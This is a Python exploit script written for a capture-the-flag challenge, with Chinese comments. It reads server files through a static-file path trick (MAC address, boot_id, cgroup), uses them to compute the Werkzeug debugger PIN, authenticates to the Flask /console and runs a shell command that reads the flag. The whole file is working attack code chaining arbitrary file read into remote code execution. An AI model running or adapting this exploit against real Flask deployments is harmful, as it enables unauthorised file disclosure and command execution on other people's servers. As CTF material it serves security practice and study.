import requests
import base64
import sys
import re

print("Exploit for NPCCTF-Final 丰川音乐")
if len(sys.argv) != 2:
    print("Usage: python exp.py <base_url>")
    sys.exit(1)
base_url = sys.argv[1]

def get_content(path):
    url = f"{base_url}/static//{path}?.svg?.wasm?init"
    response = requests.get(url)
    data = response.text
    for i in data.split("\n"):
        if i.startswith("export"):
            b64 = i.split(",")[-1][:-2]
            break
    print("File ",path, "content:", base64.b64decode(b64).decode()[:-1])
    return base64.b64decode(b64).decode()[:-1]

import hashlib
from itertools import chain
probably_public_bits = [
    'app'#/etc/passwd
    'flask.app',#默认值
    'Flask',#默认值
    '/usr/lib/python3/dist-packages/flask/app.py'#moddir，报错得到
]

private_bits = [
    str(int(get_content('/sys/class/net/eth0/address').replace(":",""),16)),
    #'2485723387650',# /sys/class/net/eth0/address 十进制
    #get_content("/etc/machine-id"),
    get_content("/proc/sys/kernel/random/boot_id")+get_content("/proc/self/cgroup").split("/")[-1]
]
 
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
 
cookie_name = '__wzd' + h.hexdigest()[:20]
 
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
 
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print("获取到PIN:", rv)
secret = requests.get(f"{base_url}/console").text
secret = re.search(r"SECRET = (.*)", secret).group(1)
secret = secret.replace('"', "").replace(";", "")
r = requests.get(f"{base_url}/console?__debugger__=yes&cmd=pinauth&pin={rv}&s={secret}")
cookies = r.cookies
payload = "import os;os.popen('/readFlag', 'r').read()"
url = str(f"{base_url}/console?&__debugger__=yes&cmd={payload}&frm=0&s={secret}")
flag = requests.get(url, cookies=cookies)
print("获取到flag:",re.findall(r"flag{.*}", flag.text)[0])